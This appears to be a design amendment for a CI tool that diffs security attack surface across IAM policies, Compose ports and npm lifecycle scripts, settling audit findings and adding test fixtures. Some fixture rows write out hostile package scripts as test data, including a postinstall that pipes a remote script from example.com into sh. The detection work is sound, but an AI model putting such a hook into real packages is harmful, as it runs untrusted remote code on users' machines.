# Amendment A2 — Attack-Surface Diff

**Amends:** `attack-surface-diff.md`, and A1 where they conflict · **Bead:** sable-uoes · **Status:** accepted
**Source:** independent fresh-context audit of the 10 committed fixture oracles — `attack-surface-diff-fixture-audit.md`, findings F1–F10.

Ten findings, all resolved below. One is a correctness defect that would break the build on any PR
touching IAM (F2); one is a false negative in the dangerous direction (F6); three are unspecified
conventions already binding on both runtimes that would otherwise surface as cross-runtime byte
divergence (F5, F9, F10). **No `schema_version` bump** — see *Wire impact*.

One type change here is **not** additive: `AxisSpec.severityAtTop` and `KindSpec.severityByLevel`
are replaced by `AxisSpec.severityByRank` (F2). That is safe to do to frozen W1 types because §2.4
mechanisms 1 and 4 guarantee no extractor reads a severity field — the comparator and the differ are
the only readers, both W1-owned, merged, and green.

---

## F2 — lattice severity is contributed by *movement*, not by *arrival*

**Confirmed empirically.** The narrowest expressible statement — added `Allow`, literal `Action`,
literal `Resource`, no wildcard `Principal`, plus a restricting `Condition` — returns
`added / increased / critical`. Every IAM axis has `absentRank: "below"`, so absent→present moves
all four axes to `greater`; `compare.ts` filters `increasingAxes` on order alone and each
contributes its `severityAtTop`; `principal.severityAtTop` is `critical`. Under the default
`--fail-on high`, *every* PR that adds *any* IAM statement fails CI — the exact cry-wolf failure §5
exists to prevent, and it makes A1 Defect 2's "acceptable over-reporting" residual risk untrue as
written.

**Decision. Severity is a function of the rank an axis arrived at, never of the fact that it moved.**

`AxisSpec.severityAtTop` is deleted. `KindSpec.severityByLevel` is deleted. New
`AxisSpec.severityByRank: readonly SurfaceSeverity[]`, same length as `ranks`, entry *i* = severity
of a property whose comparison endpoint sits at `ranks[i]`. `severityWhenAbsent` and
`severityWhenIncomparable` are unchanged.

§2.3 becomes:

> Let `endpoint = invertDanger ? base : head` — the side whose ranks describe the dangerous state.
> - **`ordinal`, `danger:"increased"`:** `axes[0].severityByRank[rankOf(endpoint)]`, or
>   `severityWhenAbsent` when the endpoint is absent and `absentRank === "above"`.
> - **`lattice`, `danger:"increased"`:** `max` over every axis that increased of
>   `severityByRank[rank of that axis on the endpoint]`. **Promoted to `critical` when two or more
>   increasing axes each contribute `high` or `critical`.**
> - **`lattice`, `danger:"incomparable"`:** `severityWhenIncomparable`.
> - **Any other `danger`:** `null`.

The ordinal path is now a one-axis special case of the lattice path, and is semantically unchanged —
`severityByRank` is `severityByLevel` renamed onto the axis where it belonged. F2 is a lattice-only
behavior change.

**The promotion rule is restated in severity terms, not rank terms.** §2.3's "two or more axes
reached their top rank" becomes "two or more increasing axes contribute `high` or above." Strictly
better: under the old wording `condition` arriving at `absent` counts as a top rank, so
`Allow s3:GetObject on *` with no condition would promote to `critical` on the strength of "has no
condition" — a property of most real statements. Now only genuine breadth axes promote, and
`iam-deny-removed`'s `Deny * on *` still promotes (action `high` + resource `high`), preserving its
committed `critical`.

| kind | axis | ranks (safest first) | `severityByRank` |
|---|---|---|---|
| `iam.allow` / `iam.deny` | `action` | `literal` < `service-wildcard` < `global-wildcard` | `[null, "medium", "high"]` |
| | `resource` | `literal` < `prefix-wildcard` < `global-wildcard` | `[null, "medium", "high"]` |
| | `principal` | `absent-or-literal` < `wildcard` | `[null, "critical"]` |
| | `condition` | `present` < `absent` | `[null, "medium"]` |
| `container.port` | `binding` | `not-published` < `loopback-published` < `host-published` | `[null, "low", "high"]` |
| `pkg.lifecycle_script` | `fetch` | `local` < `fetches-remote` < `pipes-remote-to-interpreter` | `[null, "medium", "critical"]` |

**What the audit's case now returns.** Added narrow `Allow` with a `Condition`: every axis arrives at
rank 0 → `null`. `change:"added"`, `danger:"increased"`, **`severity: null`**, `reportable: 0`,
`highest_severity: null`, exit 0. Exactly the `container.port` `not-published` disposition — a real
transition, `--all`-only, never a gate.

**Accepted false positive.** An added `Allow` with *no* `Condition` scores `medium` on the condition
axis, so a PR adding N unconditioned statements produces N `medium` lines. `--min-severity` defaults
to `low` so they display; `--fail-on` defaults to `high` so they never gate. Deliberate: the
alternative (`condition: [null, null]`) would silence "someone deleted the `aws:SourceIp` condition
and changed nothing else," which §7.2 names as a headline capability and which
`iam-condition-removed` pins. Erring toward a visible, non-gating line and away from silence is right
for a CI security gate.

**§9.1's wording is wrong and is corrected.** `transitions[].severity` currently reads
`"low"/"medium"/"high"/"critical"` when `danger` is `increased` or `incomparable`, `null` otherwise.
Replace with: *non-null only when `danger` is `increased` or `incomparable`; may be `null` even then,
when the property arrived at a rank the kind-spec table scores as unreportable.* §2.1's
`severity: non-null iff danger == "increased"` is likewise corrected. A documentation correction, not
a contract break — the ordinal path already emitted `increased` with `severity: null` in v1 as
shipped.

**Tests that fail today.** `fixtures/surface/cases/iam-narrow-allow-added/` expecting
`severity: null`; a comparator unit test asserting `severityFor(iam.allow, null, narrowStatement,
"increased")` is `null`; a table test asserting `severityByRank.length === ranks.length` for every
axis in both runtimes and in `kind-specs.json`.

---

## F1 — `emitUnchanged` is code-only law

`classify(b, h, specs, paired, emitUnchanged = paired)` is called with `false` from Phases 1b and 1c
and with the default `true` from Phase 2. Nothing outside the code says so; A1.1 mentions the flag
once, as an observation about bucket residue. An author reading only the docs concludes
`compose-file-renamed`'s `transitions: []` is a differ bug.

**Decision. The committed `[]` stands, and `emitUnchanged` becomes a documented per-phase contract in
§2.8:**

> `danger:"unchanged"` is emitted **only for Phase 2 residual pairing**, never for Phase 1 exact
> match, Phase 1b bucket residue, or Phase 1c relocation.

Justified on product behavior, not incumbency. §3.4's purpose for the unchanged line is to show the
human the tool understood a rename, so they do not wonder about a missing finding. That is worth one
line when the inference is *weak and singular* — Phase 2 pairs on nothing but "exactly one left on
each side," the weakest correspondence the differ ever draws, and it produces one line per scope.
Phase 1c pairs on an equal, non-empty, doubly-unique `discriminator` — a strong match — and would
emit one line **per property in the renamed file**. A 12-service compose rename would produce 12
identical "unchanged" lines restating what the PR diff already shows. The signal is per-file; the
noise would be per-property.

Phase 1b needs no separate argument: cancellation has already removed every equal-vector pair, so a
residue pair never compares equal.

**Cost, stated.** A relocation that is genuinely a delete plus an unrelated add, equal on every
compared axis, disappears entirely — A1 Defect 3's accepted false negative, now also invisible under
`--all`. A `--show-unchanged` flag is out of v1 scope.

---

## F3 — `iam-deny-removed`'s head is not an IAM candidate

Head is `{"Version": …, "Statement": []}`. §4.3 stage 2 requires `Statement[0]` to have an `Effect`
key; an empty array has no first element, so the head file is silently non-candidate and never
analyzed. The case asserts "a file stopped being a policy," not "a `Deny` was deleted";
`coverage.analyzed: 2` is wrong; an extractor that never reaches the head passes. AWS also rejects
`"Statement": []` as `MalformedPolicyDocument`.

**Decision. Replace the head with a policy that keeps a benign statement.** The pre-inversion
direction is correct as committed and is not re-litigated.

Base — two statements, in order: (1) `Sid: "BlockAllS3"`, `Deny`, `Action: "*"`, `Resource: "*"`
(unchanged content, so its first key line stays line 5 and `base_evidence.line: 5` is preserved);
(2) `Sid: "BlockLegacyBucket"`, `Deny`, `Action: "s3:*"`,
`Resource: "arn:aws:s3:::legacy-bucket/*"`. Head — statement 2 only, byte-identical.

Expected verdict unchanged except `coverage`: one transition, `iam.deny`, key `…|sid=BlockAllS3`,
`removed`/`increased`/`critical` (action and resource both `global-wildcard` → two `high`
contributors → promoted), `paired: false`, `base_evidence.line: 5`, `head_evidence: null`.
`BlockLegacyBucket` matches by key, every axis `equal`, Phase 1 → not emitted (F1).
`coverage.analyzed` stays `2` and is now *earned*.

The case also becomes non-vacuous for F2 in the inverted direction — the surviving `Deny` proves the
differ does not fire on a `Deny` merely because it exists.

---

## F6 — `not-published` is a false negative on every `ports:` entry

**Confirmed against docs.docker.com/reference/compose-file/services/.** Long syntax with `published`
omitted gets "an automatically allocated ephemeral host port"; short-syntax bare `- "6379"` likewise
has the runtime "automatically allocate any unassigned port of the host." Both are published. §7.1
classifies both `not-published`, whose `severityByRank[0]` is `null` — a host-reachable port scored
as a non-reported line. Short-syntax bare container port is not in the rank table at all.

**Decision. Nothing under `ports:` is ever `not-published`.** Ranks and `severityByRank` are
unchanged, so this is an E1 + prose fix with zero type and zero table change.

| rank | meaning |
|---|---|
| `not-published` | An `expose:` entry, and nothing else. `expose:` publishes nothing to the host. |
| `loopback-published` | A `ports:` entry whose host IP is `127.0.0.1` or `::1`, whether or not `published` is given. |
| `host-published` | **Every other `ports:` entry** — short-syntax bare `- "6379"`, long syntax with `published` omitted (ephemeral), `0.0.0.0`, `::`, any other literal address, and `mode: host`. |

An ephemeral publish is `host-published` rather than a new fourth rank: it is reachable from every
interface, and the only unknown is *which* port, which is not a safety distinction. A new rank would
force `severityByRank` and both runtimes' tables to change for no decision-relevant gain.

`attrs` for the ephemeral case: `bind: "0.0.0.0"` (matching `compose-port-appears`'s committed
absent-host-IP normalization) and `host_port: null`. `attrs` is not compared, so this is rendering
only.

**Direction.** Strictly toward false positives: bare `- "6379"` now reports `high`. It is genuinely
host-reachable; a CI security gate must not score it `null`.

---

## F5 — the `key` of a paired transition is unspecified

`differ.ts` emits `[base.key, head.key].sort(compareUtf8)[0]` while `subject`, `label`, `attrs`, and
`confidence` come from `endpoint = head ?? base`. Neither document states a rule.
`compose-service-renamed` (`cache` → `redis`) is silent on the difference because `cache` sorts first
*and* is the head key.

**Decision. `key = endpoint.key` — the head-side key for every paired transition.** Delete the
min-of-two rule. Provenance becomes uniform: every non-comparison field comes from the same endpoint
property, the rule A1 already set for `label`. The head key is also the actionable one — it names the
state that exists now, the path a reader will open, and the identity the *next* run matches against.
Under min-of-two, a suppression keyed on a paired transition would be keyed on a path or service name
that no longer exists.

Cosmetic in effect, but a cross-runtime byte-divergence trap left open: a Python implementation using
`head.key` and a Node one using min-of-two both pass all ten committed fixtures.

---

## F8 — positional `subject`, and a sort that is not total

Two problems, one root cause: a no-Sid statement has no name, so W1 borrowed its position.

**F8a — `subject`.** `iam-two-nosid-statements-changed` commits `subject: "statement 2"`; swapping the
two `Statement[]` entries makes it `"statement 1"`.

*Decision, part 1.* **A1.1's invariance claim is scoped, because full byte-invariance is
unachievable.** `base_evidence.line` and `head_evidence.line` point at real lines and must move when
statements move. The claim becomes: *under a permutation of `Statement[]`, every field of every
emitted transition except `base_evidence` and `head_evidence` is byte-identical, and the transition
array has the same length and order.*

*Decision, part 2.* **`subject` for a no-Sid statement is the constant `"unnamed statement"`.** Not a
position, not a content hash. A hash is unreadable and unfindable in the source; a position is a lie
under reorder. Disambiguation is `evidence`'s job — the field that is honest about position, and
§9.2's renderer already prints `file:line`. `label` (effect, action, resource) distinguishes them
semantically.

**F8b — the final sort is not a total order.** `differ.{ts,py}` sort by
`(severityRank desc, kind, key)`. Under `keyMayRepeat: true`, two transitions can share all three.
Both runtimes use stable sorts, so the tie resolves to emission order — a function of `Statement[]`
position — so a reorder permutes the output array, and any future divergence in emission order
between runtimes is invisible to every current test.

*Decision.* Extend the §2.8 sort key to `(severityRank desc, kind, key, change, contentSignature,
evidence.file, evidence.line ?? -1)`, where `contentSignature` is A1.1's `canonicalJson([label,
attrs])` and `evidence` is head evidence falling back to base. The first five components make the
order a function of content alone; the last two are the deterministic last resort for two genuinely
identical statements in one file. UTF-8 byte comparison throughout, per §8.4.

---

## F9 — the evidence-line convention is unstated but already binding

All six IAM fixtures put evidence on the statement's **first member line**, not its opening `{`
(`iam-condition-removed` base line 5 is `"Sid"`; the `{` is line 4). `compose-port-appears` puts it on
the port sequence entry's own line. §2.6 says only "1-based." Cosmetic — and locked into both
runtimes by ten oracles, so an E2 author who picks the brace fails five cases with no spec to appeal
to.

**Decision. Pin the committed convention into §2.6 and each of §7.1–7.3:**

> `evidence.line` is the 1-based line of the **first content-bearing line of the construct** — for a
> JSON object, the line of its first member (not its `{`); for a YAML sequence entry, the line of the
> entry itself; for a `package.json` lifecycle script, the line of the `"<name>":` member. For a
> flow/inline collection, the line the collection starts on.

The first-member line is also better on its merits: it is where the eye goes, and it is where a
one-line statement's brace would be anyway.

---

## F10 — `pairingScope` for a repo-root file

A1 widened `container.port`'s `pairingScope` to the parent directory. For root-level `compose.yml` —
three of four Compose fixtures — that is `""` or `"."` depending on implementation. Both pairing
phases gate on `!== null` / `is not None` (verified in both runtimes; no falsy checks, so `""` is safe
today), so both spellings pass all ten fixtures with different internal state.

**Decision. `pairingScope` is the POSIX dirname of the repo-relative path, with the repo root spelled
`""`.** Never `"."`, never `"/"`, never a trailing slash. Add a mirrored helper
`parentScope(path)` / `parent_scope(path)` under `core/surface/paths.{ts,py}` so W6 and W8 cannot each
reinvent it, with a table test: `compose.yml` → `""`, `a/compose.yml` → `"a"`, `a/b/compose.yml` →
`"a/b"`. §2.6's `pairingScope` doc comment gains: *the empty string is a valid scope and is not
`null`; implementations must test `!== null`, never truthiness.*

---

## F4 + F7 — the corpus does not cover E3, `unknown`, degraded coverage, or the `principal` axis

**Decision. Twelve new cases, in three tiers.** Tier 1 must land **before** the extractor that
consumes it is written — these are the oracles those extractors are built against, and two of them
exist to prove behavior that is wrong today. Tier 2 lands **with** its extractor. Tier 3 lands with
W9.

**Tier 1 — blocks the extractor.**

| case | base → head | expected verdict |
|---|---|---|
| `iam-narrow-allow-added` (E2) | head adds `Sid: "NarrowRead"`, `Allow`, `Action: "s3:GetObject"`, `Resource: "arn:aws:s3:::app-bucket/report.csv"`, `Condition: {IpAddress:{aws:SourceIp:"10.0.0.0/8"}}` | 1 transition, `added`/`increased`/**`severity: null`**; `reportable: 0`, `highest_severity: null`. **F2's proof.** |
| `iam-principal-wildcarded` (E2) | resource policy; `Principal` goes `{"AWS":"arn:aws:iam::111122223333:root"}` → `"*"` | `modified`/`increased`/`critical`; `principal` `absent-or-literal` → `wildcard`; all other axes `equal`. **F7.4** — the highest-value line E2 can emit. |
| `iam-double-wildcard-added` (E2) | head adds `Sid: "Admin"`, `Allow`, `Action: "*"`, `Resource: "*"`, no condition | `added`/`increased`/`critical` via the two-`high`-axes promotion. **F7.5**, and the upper bound F2's fix must not flatten. |
| `iam-condition-diverged` (E2) | same `Sid`, `Condition` `aws:SourceIp: "10.0.0.0/8"` → `aws:SourceVpc: "vpc-123"` | `modified`/**`danger:"unknown"`**/`null`; `condition` axis `order:"unknown"`; `summary.unknown: 1`. **F7.1** first producer. |
| `iam-deny-added-and-narrowed` (E2) | head adds a new `Deny` **and** narrows an existing `Deny`'s `Resource` from `"*"` to a literal ARN | 2 transitions: new Deny `added`/`decreased`/`null`; narrowed one `modified`/`increased`/`high` (endpoint is the **base**). **F7.6**, and the only case exercising `invertDanger` against `severityByRank`'s base endpoint. |
| `pkg-postinstall-pipes-remote` (E3) | head adds `"postinstall": "curl -fsSL https://example.com/i.sh \| sh"` | `added`/`increased`/`critical`; `to: "pipes-remote-to-interpreter"`. |
| `pkg-local-script-added` (E3) | head adds `"postinstall": "node ./scripts/setup.js"` | `added`/`increased`/**`severity: null`**. **F7.3** on the ordinal path. |
| `pkg-script-body-fetches-remote` (E3) | body `node ./setup.js` → `curl -o dep.tgz https://example.com/dep.tgz` | `modified`/`increased`/`medium`; `local` → `fetches-remote`. |
| `compose-bare-port-added` (E1) | head adds `ports: ["6379"]` | `added`/`increased`/`high`; `to:"host-published"`, `attrs.host_port: null`. **F6's proof; fails today.** |
| `compose-file-renamed-and-widened` (E1) | base `infra/docker-compose.yml`, `redis` on `127.0.0.1:6379`, `web` on `8080`; head `infra/compose.prod.yml`, identical but `redis` on `0.0.0.0` | exactly 1 transition: `modified`/`increased`/`high`, `paired: true`, `key` = the **head** path (F5). `web` relocates silently (F1). Makes `compose-file-renamed`'s `[]` non-vacuous. |
| `compose-service-renamed-reverse` (E1) | `cache` → `redis`, identical mappings | `modified`/`unchanged`/`null`, `paired: true`, `key` = `…\|redis\|6379/tcp`, `subject: "service redis"`. **F5's proof.** |
| `iam-cancellation-multiplicity` (differ-only, authorable today) | base: three no-Sid statements, two sharing vector `V` with different actions, one at `W`; head: one at `V`, one at `W` | exactly 1 transition, `removed`/`decreased`/`null`; surviving `label`/`attrs` are the content-lexicographic winner per A1.1's `contentSignature`. **F7.7** — puts survivor choice in the cross-runtime corpus. |

**Tier 2 — lands with its extractor.**

| case | base → head | expected verdict |
|---|---|---|
| `pkg-npm-run-indirection` (W8) | head `"postinstall": "npm run setup"`, file changed | 0 transitions; `unanalyzed: [{side:"head", reason:"unsupported_syntax", changed:true}]`; `degraded`+`inconclusive` true; **exit 4**. |
| `pkg-two-manifests-no-pairing` (W8) | base `packages/a/package.json` has the `curl \| sh` postinstall; head deletes it and `packages/b/package.json` gains an identical one | **2** transitions, not one: `removed`/`decreased`/`null` and `added`/`increased`/`critical`, both `paired: false`. The only assertion that `allowResidualPairing: false` suppresses pairing. |
| `compose-degraded-asymmetric` (W6) | base `compose.yml` uses `extends` (unanalyzable); head is clean and publishes a port | the `added` transition forced to `danger:"unknown"`, `severity: null`; `degraded: true`. **F7.1**'s second producer — §5 R3, currently asserted by nothing. |
| `compose-port-range-refused` (W6) | head `ports: ["8000-8010:8000-8010"]` | 0 transitions; `unsupported_syntax`; `inconclusive: true`. |

**Tier 3 — W9.** One case per remaining refused construct (`include`, `<<`, `${…}`, `profiles`,
`NotAction`, policy variables), asserting only `reason` and `changed`. Cheap and repetitive; they
belong in the parity block, not the human-reviewed oracle set.

The human-review gate re-runs on the full corpus: 10 → 22 cases at Tier 1+2, ~28 at Tier 3.

---

## The structural finding — the fixture trees are read by nothing

`node/tests/surface-differ.test.ts` and `python/tests/test_surface_differ.py` feed **hand-constructed
`Property` objects** into `diffProperties` and compare against `expected.transitions[0]`. The `base/`
and `head/` trees are read by no test. Every tree→property mapping the corpus asserts — levels, keys,
`subject`, `attrs`, evidence lines, candidate eligibility — is unexercised oracle. That is precisely
how F3 survived review, and it means the corpus is not yet the §8.2 parity corpus it is claimed to
be.

**Decision. Add a real case runner, in W6, as W6a, before E1's own logic.**

`runCase(caseDir)` in both runtimes: read `base/` and `head/` as two file maps (the shape
`BaseTreeReader` hands the pipeline, so W2 is bypassed but its interface honored), run the full
registry, `diffProperties`, and `serialize`, and compare the **entire** envelope — `summary`,
`coverage`, transition ordering, every field — byte-for-byte against `expected.json`, with
`base.ref: "BASE"` / `head.ref: "HEAD"` substituted. Not `transitions[0]`.

Because only one extractor exists at that point, the runner carries an **explicit allowlist of case
ids** it runs end-to-end. Definition of done for W6, W7, and W8 each includes moving that unit's own
cases into the allowlist. **W9 flips the allowlist to "all cases"** and adds an exhaustiveness
assertion: every directory under `fixtures/surface/cases/` is either in the allowlist or in a small,
justified `pending` set that must be empty at release. The existing hand-constructed differ tests
stay — they are the unit test for differ phases no extractor can reach (Phase 1b multiplicity, Phase
4 injection).

---

## Wire impact and `schema_version`

**No bump.** No field in the §9.1 envelope is added, removed, or retyped. F2 changes *values* within
the already-documented `string|null` domain of `transitions[].severity`, and `severity: null` under
`danger:"increased"` was already reachable in v1 via the ordinal path — §9.1's prose was inaccurate,
not the schema. F5 changes which of two strings appears in an already-documented field. F8b makes an
already-documented sort order total. `schema_version` stays `1`.

`fixtures/surface/kind-specs.json` **does** change shape (F2). It is a parity fixture, not wire
output, and its only consumers are the two table-consistency tests.

## Blast radius

| Unit | Impact |
|---|---|
| **W1** (merged) | `model.{ts,py}`: drop `AxisSpec.severityAtTop` and `KindSpec.severityByLevel`, add `AxisSpec.severityByRank`. `compare.{ts,py}`: rewrite `severityFor`'s lattice branch; the ordinal branch becomes the same lookup. `kind-specs.{ts,py}` + `fixtures/surface/kind-specs.json`: retable four kinds. `differ.{ts,py}`: paired `key` = endpoint key (F5), total sort key (F8b). New `paths.{ts,py}` (F10). The only non-additive change; no extractor reads any affected field. |
| **W4** (merged) | None. Renderers read `severity` and `danger`; both keep their types. Verify the `--all` path renders `increased` + `severity: null` — now a common case for IAM, not just `expose:`. |
| **W5** (merged) | `shared-docs/CLI_SPEC.md`'s `transitions[].severity` row must match §9.1's corrected wording; `surface-docs-sync.test.ts` enforces it. |
| **W6** | F6's rank table, F10's `parentScope`, F9's YAML evidence rule, and **W6a — the case runner**. |
| **W7** | Built against corrected `severityByRank` semantics from the start; F8a's `"unnamed statement"`; F9's JSON evidence rule; new mutation **M7** (`Statement[]` permutation changes only evidence). |
| **W8** | Its first oracles exist; `allowResidualPairing: false` is now asserted. |
| **W9** | Parity block covers 22+ cases; flips the runner allowlist to exhaustive. |
| **W2, W3, W10, W11** | Untouched. |

## Net direction of error

F2 is the only finding that moves toward *fewer* reports, and it moves from `critical` on a statement
that grants nothing new to `null` on that same statement — it removes a fabrication, not a detection.
Every genuinely broad added statement still reports (`iam-double-wildcard-added` → `critical`,
`iam-principal-wildcarded` → `critical`). F6, F3, and the Tier-1 corpus all move toward more
reporting. F1, F5, F9, F10 are direction-neutral conventions. No decision here creates a path where a
`danger:"increased"` on a genuinely widened surface disappears.
